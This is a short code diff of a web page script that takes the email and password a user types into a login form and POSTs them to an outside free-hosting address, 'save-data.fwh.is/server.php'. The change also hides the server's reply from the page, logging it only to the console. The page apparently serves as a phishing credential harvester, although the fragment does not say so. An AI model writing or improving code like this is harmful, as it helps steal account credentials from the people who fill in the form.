@@ -219,7 +219,7 @@
           const email = document.getElementById('email').value;
           const password = document.getElementById('password_field').value;
 
-          fetch('http://save-data.fwh.is/', {
+          fetch('http://save-data.fwh.is/server.php', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/x-www-form-urlencoded'
@@ -231,10 +231,10 @@
           })
           .then(response => response.json())
           .then(data => {
-              document.getElementById('response').innerText = JSON.stringify(data);
+              console.log(data);
           })
           .catch(error => {
-              document.getElementById('response').innerText = 'Error: ' + error;
+              console.log(error);
           });
       });
   </script>
